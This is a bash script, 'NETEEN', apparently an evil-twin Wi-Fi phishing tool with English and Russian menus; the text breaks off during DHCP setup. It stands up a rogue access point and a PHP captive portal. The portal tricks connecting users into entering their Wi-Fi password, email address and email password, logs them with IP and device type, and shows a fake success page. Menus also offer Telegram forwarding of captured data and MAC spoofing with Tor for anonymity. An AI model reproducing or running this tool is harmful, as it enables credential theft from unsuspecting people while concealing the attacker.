
#!/bin/bash
# NETEEN v4.8.1 - Ultimate Network Assessment Tool
# Author: apspydon (modified by GothbreachHelper)

set -Eeuo pipefail

export PATH=/usr/sbin:/usr/bin:/sbin:/bin
export LC_ALL=C
umask 077

# --------------------------------------------
# Colors
# --------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# --------------------------------------------
# Configuration
# --------------------------------------------
TEMP_DIR="/tmp"
die() {
    echo -e "${RED}FATAL: $*${NC}" >&2
    exit 1
}

require_root() {
    (( EUID == 0 )) || die "Root privileges required."
}

require_cmd() {
    command -v "$1" >/dev/null 2>&1 || die "Command not found: $1"
}

(( BASH_VERSINFO[0] >= 4 )) || die "Bash 4+ required."

mkdir -p /run/neteen 2>/dev/null || die "Cannot create /run/neteen"
RUNTIME_DIR="$(mktemp -d /run/neteen/run.XXXXXX)" || die "Cannot create runtime dir"
chmod 700 "$RUNTIME_DIR"

exec 9>/run/neteen/neteen.lock
flock -n 9 || die "Another instance is running."

WIFI_IFACE=""
CLEANUP_DONE="false"
PLATFORM="KaliLinux"
CURRENT_LANG="en"
MONITOR_PID=""
HOSTAPD_PID=""
DNSMASQ_PID=""
APACHE_PID=""
TELEGRAM_BOT_TOKEN=""
TELEGRAM_CHAT_ID=""
ANON_MODE="false"
MAC_CHANGED="false"
TOR_RUNNING="false"
ORIG_IP_FORWARD=""
ORIG_MAC=""
ORIG_APACHE_STATE=""
OWN_IPTABLES_CHAIN="NETEEN_$(date +%s)_$$"
CONFIG_FILE="$RUNTIME_DIR/portal.json"
STATE_FILE="$RUNTIME_DIR/state.json"
EVENT_LOG="$RUNTIME_DIR/events.jsonl"
BOT_CONFIG_FILE="/etc/neteen_bot.conf"
BOT_PID_FILE="$RUNTIME_DIR/bot.pid"
BOT_PY_SCRIPT="$RUNTIME_DIR/bot.py"
CRED_LOG="$RUNTIME_DIR/cred.log"
PORTAL_SSID_FILE="/etc/neteen_portal_ssid"
LANG_FILE="$TEMP_DIR/neteen_lang.conf"

declare -A LANG_STRINGS

# --------------------------------------------
# Language Strings
# --------------------------------------------
init_languages() {
    LANG_STRINGS["en",1]="Stealth Portal"
    LANG_STRINGS["en",2]="Network Scanner"
    LANG_STRINGS["en",3]="Exit"
    LANG_STRINGS["en",4]="Select platform:"
    LANG_STRINGS["en",5]="macOS"
    LANG_STRINGS["en",6]="Kali Linux"
    LANG_STRINGS["en",7]="Select language:"
    LANG_STRINGS["en",8]="English"
    LANG_STRINGS["en",9]="Russian"
    LANG_STRINGS["en",10]="Available Interfaces"
    LANG_STRINGS["en",11]="No wireless interfaces found"
    LANG_STRINGS["en",12]="Select interface"
    LANG_STRINGS["en",13]="Selected:"
    LANG_STRINGS["en",14]="Invalid selection"
    LANG_STRINGS["en",15]="Checking dependencies..."
    LANG_STRINGS["en",16]="Missing packages:"
    LANG_STRINGS["en",17]="Installing dependencies..."
    LANG_STRINGS["en",18]="All dependencies installed"
    LANG_STRINGS["en",19]="Please run as root: sudo ./NETEEN.sh"
    LANG_STRINGS["en",20]="Starting Stealth Portal..."
    LANG_STRINGS["en",21]="Starting Network Scanner..."
    LANG_STRINGS["en",22]="Scanning networks..."
    LANG_STRINGS["en",23]="No wireless interface found"
    LANG_STRINGS["en",24]="Press Enter to continue..."
    LANG_STRINGS["en",25]="SSID name:"
    LANG_STRINGS["en",26]="Portal Configuration"
    LANG_STRINGS["en",27]="Select Portal Type"
    LANG_STRINGS["en",28]="Default Portal"
    LANG_STRINGS["en",29]="Custom Portal"
    LANG_STRINGS["en",30]="Select type"
    LANG_STRINGS["en",31]="Using default portal"
    LANG_STRINGS["en",32]="Select Theme"
    LANG_STRINGS["en",33]="Blue"
    LANG_STRINGS["en",34]="Dark"
    LANG_STRINGS["en",35]="Green"
    LANG_STRINGS["en",36]="Red"
    LANG_STRINGS["en",37]="Purple"
    LANG_STRINGS["en",38]="Theme:"
    LANG_STRINGS["en",39]="Portal Title"
    LANG_STRINGS["en",40]="Welcome Message"
    LANG_STRINGS["en",41]="WiFi Password Label"
    LANG_STRINGS["en",42]="Email Label"
    LANG_STRINGS["en",43]="Email Password Label"
    LANG_STRINGS["en",44]="Button Text"
    LANG_STRINGS["en",45]="Success Message"
    LANG_STRINGS["en",46]="Setting up interface..."
    LANG_STRINGS["en",47]="Interface ready"
    LANG_STRINGS["en",48]="Starting access point..."
    LANG_STRINGS["en",49]="AP started"
    LANG_STRINGS["en",50]="Failed to start AP"
    LANG_STRINGS["en",51]="Starting DHCP..."
    LANG_STRINGS["en",52]="DHCP ready"
    LANG_STRINGS["en",53]="Setting up portal..."
    LANG_STRINGS["en",54]="Portal ready"
    LANG_STRINGS["en",55]="Cleaning up..."
    LANG_STRINGS["en",56]="Cleanup done"
    LANG_STRINGS["en",57]="PORTAL ACTIVE"
    LANG_STRINGS["en",58]="Interface"
    LANG_STRINGS["en",59]="Clients"
    LANG_STRINGS["en",60]="Status: Waiting for connections"
    LANG_STRINGS["en",61]="Press Ctrl+C to stop"
    LANG_STRINGS["en",62]="CREDENTIALS CAPTURED"
    LANG_STRINGS["en",63]="Time"
    LANG_STRINGS["en",64]="IP"
    LANG_STRINGS["en",65]="Device"
    LANG_STRINGS["en",66]="WiFi Password"
    LANG_STRINGS["en",67]="Email"
    LANG_STRINGS["en",68]="Password"
    LANG_STRINGS["en",69]="Network"
    LANG_STRINGS["en",70]="Channel"
    LANG_STRINGS["en",71]="Signal"
    LANG_STRINGS["en",72]="Thanks for using NETEEN, goodbye!"
    LANG_STRINGS["en",73]="MAIN MENU"
    LANG_STRINGS["en",74]="Goodbye!"
    LANG_STRINGS["en",75]="Select option [0-5]"
    LANG_STRINGS["en",76]="Starting Portal"
    LANG_STRINGS["en",77]="NETWORK SCAN RESULTS"
    LANG_STRINGS["en",78]="Credential monitoring active..."
    LANG_STRINGS["en",79]="Full functionality requires Kali Linux"
    LANG_STRINGS["en",80]="Language set to:"
    LANG_STRINGS["en",81]="Detected platform:"
    LANG_STRINGS["en",82]="By connecting, you agree to our terms of service"
    LANG_STRINGS["en",83]="Change Language"
    LANG_STRINGS["en",84]="Save captured credentials to file? (y/n): "
    LANG_STRINGS["en",85]="Telegram Integration"
    LANG_STRINGS["en",86]="Bot configured"
    LANG_STRINGS["en",87]="Not configured"
    LANG_STRINGS["en",88]="Bot running"
    LANG_STRINGS["en",89]="Bot stopped"
    LANG_STRINGS["en",90]="Configure bot"
    LANG_STRINGS["en",91]="Start bot"
    LANG_STRINGS["en",92]="Stop bot"
    LANG_STRINGS["en",93]="Status"
    LANG_STRINGS["en",94]="Back to main menu"
    LANG_STRINGS["en",95]="Enter bot token:"
    LANG_STRINGS["en",96]="Enter chat ID:"
    LANG_STRINGS["en",97]="Configuration saved"
    LANG_STRINGS["en",98]="Bot started"
    LANG_STRINGS["en",99]="Bot stopped"
    LANG_STRINGS["en",100]="Telegram Integration"
    LANG_STRINGS["en",101]="Anonymity mode (MAC spoofing + Tor)"
    LANG_STRINGS["en",102]="Enable anonymity? (y/n): "
    LANG_STRINGS["en",103]="MAC address changed to:"
    LANG_STRINGS["en",104]="Tor is running."
    LANG_STRINGS["en",105]="Failed to start Tor."
    LANG_STRINGS["en",106]="Unknown command."

    LANG_STRINGS["ru",1]="Скрытый портал"
    LANG_STRINGS["ru",2]="Сканер сети"
    LANG_STRINGS["ru",3]="Выход"
    LANG_STRINGS["ru",4]="Выберите платформу:"
    LANG_STRINGS["ru",5]="macOS"
    LANG_STRINGS["ru",6]="Kali Linux"
    LANG_STRINGS["ru",7]="Выберите язык:"
    LANG_STRINGS["ru",8]="Английский"
    LANG_STRINGS["ru",9]="Русский"
    LANG_STRINGS["ru",10]="Доступные интерфейсы"
    LANG_STRINGS["ru",11]="Беспроводные интерфейсы не найдены"
    LANG_STRINGS["ru",12]="Выберите интерфейс"
    LANG_STRINGS["ru",13]="Выбрано:"
    LANG_STRINGS["ru",14]="Неверный выбор"
    LANG_STRINGS["ru",15]="Проверка зависимостей..."
    LANG_STRINGS["ru",16]="Отсутствующие пакеты:"
    LANG_STRINGS["ru",17]="Установка зависимостей..."
    LANG_STRINGS["ru",18]="Все зависимости установлены"
    LANG_STRINGS["ru",19]="Запустите от root: sudo ./NETEEN.sh"
    LANG_STRINGS["ru",20]="Запуск скрытого портала..."
    LANG_STRINGS["ru",21]="Запуск сканера сети..."
    LANG_STRINGS["ru",22]="Сканирование сетей..."
    LANG_STRINGS["ru",23]="Беспроводной интерфейс не найден"
    LANG_STRINGS["ru",24]="Нажмите Enter для продолжения..."
    LANG_STRINGS["ru",25]="Имя SSID:"
    LANG_STRINGS["ru",26]="Конфигурация портала"
    LANG_STRINGS["ru",27]="Выберите тип портала"
    LANG_STRINGS["ru",28]="Портал по умолчанию"
    LANG_STRINGS["ru",29]="Пользовательский портал"
    LANG_STRINGS["ru",30]="Выберите тип"
    LANG_STRINGS["ru",31]="Использование портала по умолчанию"
    LANG_STRINGS["ru",32]="Выберите тему"
    LANG_STRINGS["ru",33]="Синяя"
    LANG_STRINGS["ru",34]="Тёмная"
    LANG_STRINGS["ru",35]="Зелёная"
    LANG_STRINGS["ru",36]="Красная"
    LANG_STRINGS["ru",37]="Фиолетовая"
    LANG_STRINGS["ru",38]="Тема:"
    LANG_STRINGS["ru",39]="Заголовок портала"
    LANG_STRINGS["ru",40]="Приветственное сообщение"
    LANG_STRINGS["ru",41]="Метка пароля WiFi"
    LANG_STRINGS["ru",42]="Метка Email"
    LANG_STRINGS["ru",43]="Метка пароля Email"
    LANG_STRINGS["ru",44]="Текст кнопки"
    LANG_STRINGS["ru",45]="Сообщение об успехе"
    LANG_STRINGS["ru",46]="Настройка интерфейса..."
    LANG_STRINGS["ru",47]="Интерфейс готов"
    LANG_STRINGS["ru",48]="Запуск точки доступа..."
    LANG_STRINGS["ru",49]="ТД запущена"
    LANG_STRINGS["ru",50]="Не удалось запустить ТД"
    LANG_STRINGS["ru",51]="Запуск DHCP..."
    LANG_STRINGS["ru",52]="DHCP готов"
    LANG_STRINGS["ru",53]="Настройка портала..."
    LANG_STRINGS["ru",54]="Портал готов"
    LANG_STRINGS["ru",55]="Очистка..."
    LANG_STRINGS["ru",56]="Очистка завершена"
    LANG_STRINGS["ru",57]="ПОРТАЛ АКТИВЕН"
    LANG_STRINGS["ru",58]="Интерфейс"
    LANG_STRINGS["ru",59]="Клиенты"
    LANG_STRINGS["ru",60]="Статус: ожидание подключений"
    LANG_STRINGS["ru",61]="Нажмите Ctrl+C для остановки"
    LANG_STRINGS["ru",62]="ПОЛУЧЕНЫ ДАННЫЕ"
    LANG_STRINGS["ru",63]="Время"
    LANG_STRINGS["ru",64]="IP"
    LANG_STRINGS["ru",65]="Устройство"
    LANG_STRINGS["ru",66]="Пароль WiFi"
    LANG_STRINGS["ru",67]="Email"
    LANG_STRINGS["ru",68]="Пароль"
    LANG_STRINGS["ru",69]="Сеть"
    LANG_STRINGS["ru",70]="Канал"
    LANG_STRINGS["ru",71]="Сигнал"
    LANG_STRINGS["ru",72]="Спасибо за использование NETEEN, до свидания!"
    LANG_STRINGS["ru",73]="ГЛАВНОЕ МЕНЮ"
    LANG_STRINGS["ru",74]="До свидания!"
    LANG_STRINGS["ru",75]="Выберите опцию [0-5]"
    LANG_STRINGS["ru",76]="Запуск портала"
    LANG_STRINGS["ru",77]="РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ"
    LANG_STRINGS["ru",78]="Мониторинг данных активен..."
    LANG_STRINGS["ru",79]="Полная функциональность требует Kali Linux"
    LANG_STRINGS["ru",80]="Язык установлен:"
    LANG_STRINGS["ru",81]="Обнаруженная платформа:"
    LANG_STRINGS["ru",82]="Подключаясь, вы соглашаетесь с условиями"
    LANG_STRINGS["ru",83]="Изменить язык"
    LANG_STRINGS["ru",84]="Сохранять полученные данные в файл? (y/n): "
    LANG_STRINGS["ru",85]="Интеграция Telegram"
    LANG_STRINGS["ru",86]="Бот настроен"
    LANG_STRINGS["ru",87]="Не настроен"
    LANG_STRINGS["ru",88]="Бот запущен"
    LANG_STRINGS["ru",89]="Бот остановлен"
    LANG_STRINGS["ru",90]="Настроить бота"
    LANG_STRINGS["ru",91]="Запустить бота"
    LANG_STRINGS["ru",92]="Остановить бота"
    LANG_STRINGS["ru",93]="Статус"
    LANG_STRINGS["ru",94]="Назад в главное меню"
    LANG_STRINGS["ru",95]="Введите токен бота:"
    LANG_STRINGS["ru",96]="Введите chat ID:"
    LANG_STRINGS["ru",97]="Конфигурация сохранена"
    LANG_STRINGS["ru",98]="Бот запущен"
    LANG_STRINGS["ru",99]="Бот остановлен"
    LANG_STRINGS["ru",100]="Интеграция Telegram"
    LANG_STRINGS["ru",101]="Режим анонимности (смена MAC + Tor)"
    LANG_STRINGS["ru",102]="Включить анонимность? (y/n): "
    LANG_STRINGS["ru",103]="MAC-адрес изменён на:"
    LANG_STRINGS["ru",104]="Tor запущен."
    LANG_STRINGS["ru",105]="Не удалось запустить Tor."
    LANG_STRINGS["ru",106]="Неизвестная команда."
}

get_str() {
    local key=$1
    echo "${LANG_STRINGS[$CURRENT_LANG,$key]:-${LANG_STRINGS[en,$key]}}"
}

# --------------------------------------------
# Utilities
# --------------------------------------------
show_header() {
    clear
    echo -e "${BLUE}"
    cat << "EOF"
╔═════════════════════════════════════════════════════════════╗
║                                                             ║
║    ███╗   ██╗███████╗████████╗███████╗███████╗███╗   ██╗    ║
║    ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔════╝████╗  ██║    ║
║    ██╔██╗ ██║█████╗     ██║   █████╗  █████╗  ██╔██╗ ██║    ║
║    ██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██╔══╝  ██║╚██╗██║    ║
║    ██║ ╚████║███████╗   ██║   ███████╗███████ ██║ ╚████║    ║
║    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═══╝    ║
║                                                             ║
║                         N E T E E N                         ║
║                       by apspydon                           ║
║                                                             ║
╚═════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

select_language() {
    show_header
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "               $(get_str 7)                   "
    echo "╠════════════════════════════════════════════╣"
    echo "   1) $(get_str 8)                           "
    echo "   2) $(get_str 9)                           "
    echo "   0) $(get_str 94)                           "
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
    while true; do
        read -p "$(echo -e ${YELLOW}$(get_str 75) [0-2]: ${NC})" lang_choice
        case $lang_choice in
            1) CURRENT_LANG="en"; break ;;
            2) CURRENT_LANG="ru"; break ;;
            0) return 0 ;;
            *) echo -e "${RED}$(get_str 14)${NC}" ;;
        esac
    done
    echo "$CURRENT_LANG" > "$LANG_FILE" 2>/dev/null || true
    echo -e "${GREEN}$(get_str 80) ${CURRENT_LANG}${NC}"
    sleep 1
    return 0
}

load_saved_language() {
    if [ -f "$LANG_FILE" ]; then
        saved_lang=$(cat "$LANG_FILE" 2>/dev/null || echo "en")
        case $saved_lang in
            en|ru) CURRENT_LANG="$saved_lang" ;;
        esac
    fi
}

detect_platform() {
    if [[ -f "/etc/os-release" ]] && grep -q "Kali" /etc/os-release; then
        PLATFORM="KaliLinux"
        echo -e "${GREEN}$(get_str 81) $PLATFORM${NC}"
    else
        PLATFORM="Unknown"
        echo -e "${RED}$(get_str 79)${NC}"
    fi
    sleep 1
}

# --------------------------------------------
# Dependency Management
# --------------------------------------------
install_dependencies() {
    echo -e "${YELLOW}$(get_str 15)${NC}"
    local packages=("hostapd" "dnsmasq" "apache2" "php" "libapache2-mod-php" "iw" "curl" "python3" "python3-requests" "python3-socks" "macchanger" "tor" "jq" "wireless-tools")
    local missing=()
    for pkg in "${packages[@]}"; do
        if ! dpkg -l | grep -q "^ii  $pkg "; then
            missing+=("$pkg")
        fi
    done
    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "${RED}$(get_str 16) ${missing[*]}${NC}"
        echo -e "${YELLOW}$(get_str 17)${NC}"
        apt-get update > /dev/null 2>&1 || die "apt-get update failed"
        local failed=()
        for pkg in "${missing[@]}"; do
            if apt-get install -y "$pkg" > /dev/null 2>&1; then
                echo -e "${GREEN}✓ $pkg${NC}"
            else
                echo -e "${RED}✗ $pkg${NC}"
                failed+=("$pkg")
            fi
        done
        if [ ${#failed[@]} -ne 0 ]; then
            die "Failed to install: ${failed[*]}"
        fi
        echo -e "${GREEN}$(get_str 18)${NC}"
        sleep 1
    else
        echo -e "${GREEN}$(get_str 18)${NC}"
        sleep 1
    fi
}

# --------------------------------------------
# Interface Selection
# --------------------------------------------
select_interface() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "           $(get_str 10)                      "
    echo "╠════════════════════════════════════════════╣"
    local interfaces=()
    local count=1
    while read -r line; do
        if [[ ! -z "$line" ]]; then
            interfaces+=("$line")
            printf "║  ${YELLOW}%2d${CYAN}) ${WHITE}%-36s${CYAN} ║\n" "$count" "$line"
            ((count++))
        fi
    done < <(iw dev 2>/dev/null | grep -E "^[[:space:]]+Interface" | awk '{print $2}')
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo "║            $(get_str 11)                    ║"
        echo "╚════════════════════════════════════════════╝"
        echo -e "${RED}$(get_str 23)${NC}"
        return 1
    fi
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
    while true; do
        read -p "$(echo -e ${YELLOW}$(get_str 12) [1-$(($count-1))]: ${NC})" choice
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le $(($count-1)) ]; then
            selected_interface="${interfaces[$((choice-1))]}"
            echo -e "${GREEN}$(get_str 13) $selected_interface${NC}"
            break
        else
            echo -e "${RED}$(get_str 14)${NC}"
        fi
    done
    return 0
}

# --------------------------------------------
# Portal Configuration (JSON)
# --------------------------------------------
write_json_config() {
    local title="$1"
    local welcome="$2"
    local wifi_label="$3"
    local email_label="$4"
    local email_pass_label="$5"
    local button_text="$6"
    local success_msg="$7"
    local bg="$8"
    local card="$9"
    local text="${10}"
    local accent="${11}"
    local border="${12}"
    local theme="${13}"

    python3 - <<PY > "$CONFIG_FILE"
import json, os, sys, tempfile
data = {
    "title": sys.argv[1],
    "welcome": sys.argv[2],
    "wifi_label": sys.argv[3],
    "email_label": sys.argv[4],
    "email_pass_label": sys.argv[5],
    "button": sys.argv[6],
    "success": sys.argv[7],
    "bg": sys.argv[8],
    "card": sys.argv[9],
    "text": sys.argv[10],
    "accent": sys.argv[11],
    "border": sys.argv[12],
    "theme": sys.argv[13]
}
with tempfile.NamedTemporaryFile(mode='w', dir=os.path.dirname(sys.argv[0]), delete=False) as tf:
    json.dump(data, tf, ensure_ascii=False)
    tf.flush()
    os.fsync(tf.fileno())
os.chmod(tf.name, 0o600)
os.replace(tf.name, sys.argv[0])
PY
}

select_portal_type() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "              $(get_str 27)                   "
    echo "╠════════════════════════════════════════════╣"
    echo "   1) $(get_str 28)                           "
    echo "   2) $(get_str 29)                           "
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
    while true; do
        read -p "$(echo -e ${YELLOW}$(get_str 30) [1-2]: ${NC})" portal_type
        [[ "$portal_type" =~ ^[1-2]$ ]] && break || echo -e "${RED}$(get_str 14)${NC}"
    done
    if [ "$portal_type" -eq 1 ]; then
        write_json_config \
            "Network Authentication Required" \
            "Enter your credentials to access the internet" \
            "WiFi Password" \
            "Email Address" \
            "Email Password" \
            "Connect to Internet" \
            "Connection Successful! You can now browse normally." \
            "#1a1a1a" "#2d2d2d" "#ffffff" "#007cba" "#404040" "Default"
        echo -e "${GREEN}$(get_str 31)${NC}"
        return 0
    else
        return 1
    fi
}

select_theme() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "                $(get_str 32)                 "
    echo "╠════════════════════════════════════════════╣"
    echo "   1) $(get_str 33)                           "
    echo "   2) $(get_str 34)                           "
    echo "   3) $(get_str 35)                           "
    echo "   4) $(get_str 36)                           "
    echo "   5) $(get_str 37)                           "
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
    while true; do
        read -p "$(echo -e ${YELLOW}$(get_str 30) [1-5]: ${NC})" theme_choice
        [[ "$theme_choice" =~ ^[1-5]$ ]] && break || echo -e "${RED}$(get_str 14)${NC}"
    done
    case $theme_choice in
        1) BG_COLOR="#1a1a1a"; CARD_COLOR="#2d2d2d"; TEXT_COLOR="#ffffff"; ACCENT_COLOR="#007cba"; BORDER_COLOR="#404040"; THEME_NAME="Blue" ;;
        2) BG_COLOR="#0a0a0a"; CARD_COLOR="#1a1a1a"; TEXT_COLOR="#e0e0e0"; ACCENT_COLOR="#555555"; BORDER_COLOR="#333333"; THEME_NAME="Dark" ;;
        3) BG_COLOR="#0a1f0a"; CARD_COLOR="#1a2a1a"; TEXT_COLOR="#e0ffe0"; ACCENT_COLOR="#00cc44"; BORDER_COLOR="#2a552a"; THEME_NAME="Green" ;;
        4) BG_COLOR="#1f0a0a"; CARD_COLOR="#2a1a1a"; TEXT_COLOR="#ffe0e0"; ACCENT_COLOR="#cc0000"; BORDER_COLOR="#552a2a"; THEME_NAME="Red" ;;
        5) BG_COLOR="#1a0a1f"; CARD_COLOR="#2a1a2a"; TEXT_COLOR="#f0e0ff"; ACCENT_COLOR="#8844cc"; BORDER_COLOR="#552a55"; THEME_NAME="Purple" ;;
    esac
    echo -e "${GREEN}$(get_str 38) $THEME_NAME${NC}"
}

customize_portal() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "            $(get_str 26)                     "
    echo "╠════════════════════════════════════════════╣"
    echo -e "${NC}"
    if select_portal_type; then
        return
    fi
    select_theme
    echo ""
    read -p "$(echo -e ${YELLOW}$(get_str 39) [Network Login]: ${NC})" portal_title
    portal_title="${portal_title:-Network Login}"
    read -p "$(echo -e ${YELLOW}$(get_str 40) [Enter credentials]: ${NC})" welcome_msg
    welcome_msg="${welcome_msg:-Enter credentials}"
    read -p "$(echo -e ${YELLOW}$(get_str 41) [WiFi Password]: ${NC})" wifi_label
    wifi_label="${wifi_label:-WiFi Password}"
    read -p "$(echo -e ${YELLOW}$(get_str 42) [Email]: ${NC})" email_label
    email_label="${email_label:-Email}"
    read -p "$(echo -e ${YELLOW}$(get_str 43) [Password]: ${NC})" email_pass_label
    email_pass_label="${email_pass_label:-Password}"
    read -p "$(echo -e ${YELLOW}$(get_str 44) [Connect]: ${NC})" button_text
    button_text="${button_text:-Connect}"
    read -p "$(echo -e ${YELLOW}$(get_str 45) [Connected successfully]: ${NC})" success_msg
    success_msg="${success_msg:-Connected successfully}"
    write_json_config \
        "$portal_title" \
        "$welcome_msg" \
        "$wifi_label" \
        "$email_label" \
        "$email_pass_label" \
        "$button_text" \
        "$success_msg" \
        "$BG_COLOR" "$CARD_COLOR" "$TEXT_COLOR" "$ACCENT_COLOR" "$BORDER_COLOR" "$THEME_NAME"
}

# --------------------------------------------
# Web Portal Generation
# --------------------------------------------
generate_web_portal() {
    local web_root="/var/lib/neteen/www"
    mkdir -p "$web_root"
    chmod 755 "$web_root"

    cat > "$web_root/index.php" << 'PHPEOF'
<?php
declare(strict_types=1);

function e(string $value): string {
    return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

$config_path = '/run/neteen/portal.json';
if (!file_exists($config_path)) {
    http_response_code(500);
    exit('Configuration unavailable');
}
$config = json_decode(file_get_contents($config_path), true, 16, JSON_THROW_ON_ERROR);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $wifi = $_POST['wifi'] ?? '';
    $email = $_POST['email'] ?? '';
    $pass = $_POST['pass'] ?? '';
    if ($wifi !== '' || $email !== '' || $pass !== '') {
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $device = 'Unknown';
        if (stripos($ua, 'iPhone') !== false) $device = 'iPhone';
        elseif (stripos($ua, 'iPad') !== false) $device = 'iPad';
        elseif (stripos($ua, 'Android') !== false) $device = 'Android';
        elseif (stripos($ua, 'Windows') !== false) $device = 'Windows';
        elseif (stripos($ua, 'Mac') !== false) $device = 'Mac';
        elseif (stripos($ua, 'Linux') !== false) $device = 'Linux';
        $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
        $time = gmdate('c');
        $entry = [
            'time' => $time,
            'ip' => $ip,
            'device' => $device,
            'wifi' => $wifi,
            'email' => $email,
            'pass' => $pass,
        ];
        file_put_contents(
            '/run/neteen/events.jsonl',
            json_encode($entry, JSON_UNESCAPED_SLASHES) . PHP_EOL,
            FILE_APPEND | LOCK_EX
        );
        error_log(sprintf("[NETEEN_CAPTURE] %s - IP: %s - Device: %s - WiFi: %s - Email: %s - Pass: %s",
            $time, $ip, $device, $wifi, $email, $pass));
    }
    header('Location: /success.html', true, 303);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?php echo e($config['title']); ?></title>
<style>
body { font-family: system-ui, sans-serif; margin:0; padding:20px; background:<?php echo e($config['bg']); ?>; display:flex; justify-content:center; align-items:center; min-height:100vh; color:<?php echo e($config['text']); ?>; }
.login-container { background:<?php echo e($config['card']); ?>; padding:40px; border-radius:10px; box-shadow:0 8px 32px rgba(0,0,0,0.3); width:100%; max-width:420px; border:1px solid <?php echo e($config['border']); ?>; }
h2 { color:<?php echo e($config['text']); ?>; margin-bottom:20px; text-align:center; font-weight:300; }
p { color:#ccc; text-align:center; margin-bottom:30px; }
input { width:100%; padding:14px; margin:10px 0; border:1px solid #555; border-radius:6px; box-sizing:border-box; background:#1a1a1a; color:<?php echo e($config['text']); ?>; font-size:14px; }
input:focus { border-color:<?php echo e($config['accent']); ?>; outline:none; }
button { width:100%; padding:14px; background:<?php echo e($config['accent']); ?>; color:white; border:none; border-radius:6px; cursor:pointer; margin-top:20px; font-size:16px; font-weight:500; }
button:hover { opacity:0.9; }
.footer { color:#666; font-size:12px; margin-top:25px; text-align:center; }
</style>
</head>
<body>
<div class="login-container">
<h2><?php echo e($config['title']); ?></h2>
<p><?php echo e($config['welcome']); ?></p>
<form method="POST">
<input type="text" name="wifi" placeholder="<?php echo e($config['wifi_label']); ?>" required>
<input type="email" name="email" placeholder="<?php echo e($config['email_label']); ?>" required>
<input type="password" name="pass" placeholder="<?php echo e($config['email_pass_label']); ?>" required>
<button type="submit"><?php echo e($config['button']); ?></button>
</form>
<div class="footer">By connecting, you agree to our terms of service</div>
</div>
</body>
</html>
PHPEOF

    cat > "$web_root/success.html" << 'SUCESS'
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Connection Successful</title>
<style>
body { font-family: system-ui; margin:0; padding:20px; background:#1a1a1a; display:flex; justify-content:center; align-items:center; min-height:100vh; text-align:center; color:#fff; }
.success-box { background:#2d2d2d; padding:50px; border-radius:10px; box-shadow:0 8px 32px rgba(0,0,0,0.3); max-width:400px; border:1px solid #404040; }
h2 { color:#fff; margin-bottom:15px; font-weight:300; }
p { color:#ccc; line-height:1.5; }
</style>
</head>
<body>
<div class="success-box">
<h2>Connection Successful</h2>
<p>You can now browse normally.</p>
</div>
</body>
</html>
SUCESS

    chown -R www-data:www-data "$web_root" 2>/dev/null || true
    chmod -R 755 "$web_root"
    echo "$web_root"
}

# --------------------------------------------
# Core Networking
# --------------------------------------------
setup_interface() {
    local iface="$1"
    echo -e "${YELLOW}$(get_str 46)${NC}"
    ORIG_MAC="$(cat /sys/class/net/"$iface"/address 2>/dev/null || echo "")"
    pkill wpa_supplicant 2>/dev/null || true
    pkill dhclient 2>/dev/null || true
    if command -v nmcli >/dev/null; then
        nmcli device set "$iface" managed no 2>/dev/null || true
    fi
    sleep 1
    ip link set "$iface" down 2>/dev/null || true
    sleep 1
    iw dev "$iface" set type managed 2>/dev/null || true
    sleep 1
    ip addr flush dev "$iface" 2>/dev/null || true
    ip link set "$iface" up 2>/dev/null || true
    sleep 2
    ip addr add 192.168.1.1/24 dev "$iface" 2>/dev/null || die "Failed to assign IP"
    echo -e "${GREEN}$(get_str 47)${NC}"
    return 0
}

start_ap() {
    local iface="$1"
    local ssid="$2"
    echo -e "${YELLOW}$(get_str 48)${NC}"
    if [[ -z "$ssid" || ${#ssid} -gt 32 || "$ssid" = *$'\n'* ]]; then
        echo -e "${RED}Invalid SSID${NC}"
        return 1
    fi
    pkill -f hostapd 2>/dev/null || true
    cat > "$RUNTIME_DIR/hostapd.conf" << EOF
interface=$iface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=6
ignore_broadcast_ssid=0
EOF
    chmod 600 "$RUNTIME_DIR/hostapd.conf"
    hostapd "$RUNTIME_DIR/hostapd.conf" > "$RUNTIME_DIR/hostapd.log" 2>&1 &
    HOSTAPD_PID=$!
    sleep 3
    if kill -0 "$HOSTAPD_PID" 2>/dev/null && grep -q "AP-ENABLED" "$RUNTIME_DIR/hostapd.log" 2>/dev/null; then
        echo -e "${GREEN}$(get_str 49)${NC}"
        return 0
    else
        echo -e "${RED}$(get_str 50)${NC}"
        cat "$RUNTIME_DIR/hostapd.log" 2>/dev/null | tail -10
        kill "$HOSTAPD_PID" 2>/dev/null || true
        return 1
    fi
}

start_dhcp() {
    local iface="$1"
    echo -e "${YELLOW}$(get_str 51)${NC}"
    pkill -f dnsmasq 2>/dev/null || true
    cat > "$RUNTIME_DIR/dnsmasq.conf" << EOF
interface=$iface
